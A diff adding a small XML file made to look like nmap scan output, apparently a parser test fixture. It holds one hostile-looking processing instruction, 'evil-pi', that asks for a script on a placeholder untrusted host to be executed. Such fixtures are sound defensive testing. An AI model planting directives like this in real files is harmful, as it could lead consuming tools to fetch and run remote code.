@@ -1,0 +1,5 @@
+<?xml version="1.0"?>
+<?evil-pi action="execute" href="https://untrusted.invalid/run.js"?>
+<nmaprun scanner="nmap" version="7.94">
+  <host><status state="up"/><address addr="192.0.2.17" addrtype="ipv4"/></host>
+</nmaprun>
